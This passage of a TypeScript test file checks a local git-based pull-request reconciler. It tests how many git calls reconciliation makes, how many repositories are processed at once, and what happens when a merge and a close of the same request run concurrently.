      await ctx.store.saveRequest({ tenant: ctx.tenant, repoId: repo.id, number: 1000 + n, provider: "local", url: `local://requests/${repo.id}/${1000 + n}`, branch, headSha: head, title: "t", status: kind === 1 ? "merged" : "open", createdAt: new Date().toISOString(), createdBy: "x" });
    }
    git(["update-ref", "--stdin"], bare, refs.join("\n") + "\n");
    const counted = gitCounter(root);

    // when
    try {
      await reconcileLocalRequests(ctx);
    } finally {
      counted.stop();
    }

    // then
    expect(counted.calls()).toBeLessThanOrEqual(12);
    const statuses = new Map((await ctx.store.listRequests(ctx.tenant, repo.id)).map((r) => [r.number, r.status]));
    for (let n = 1; n <= 300; n++) expect(statuses.get(1000 + n)).toBe(["merged", "open", "open"][n % 3]);
  });

  it("given many repositories, when the orchestrator starts, then several are checked side by side and no more than eight at once", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    for (let i = 0; i < 12; i++) {
      const copy = join(root, `copy-${i}.git`);
      git(["clone", "--quiet", "--bare", bare, copy], root);
      await ctx.store.upsertRepo({ tenant: ctx.tenant, id: `copy-${i}`, team: "Payments", name: `copy-${i}`, url: `file://${copy}` });
    }
    const overlap = gitOverlap(root);

    // when
    try {
      await reconcileLocalRequests(ctx);
    } finally {
      overlap.stop();
    }

    // then
    expect(overlap.most()).toBeGreaterThan(1);
    expect(overlap.most()).toBeLessThanOrEqual(8);
  });

  it("given a merge and a close of one request sent at once, when both run, then the record and the default branch agree", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, bare, head } = await repoOf(ctx);
    const request = await opened(ctx);

    // when
    await Promise.allSettled([mergeRequest(ctx, repo, request.number, PAYMENTS_OWNER), closeRequest(ctx, repo, request.number)]);

    // then
    const status = (await ctx.store.getRequest(ctx.tenant, repo.id, request.number))!.status;
    const moved = git(["rev-parse", "main"], bare).trim() !== head;
    expect(status === "merged" ? moved : !moved).toBe(true);
  });
});
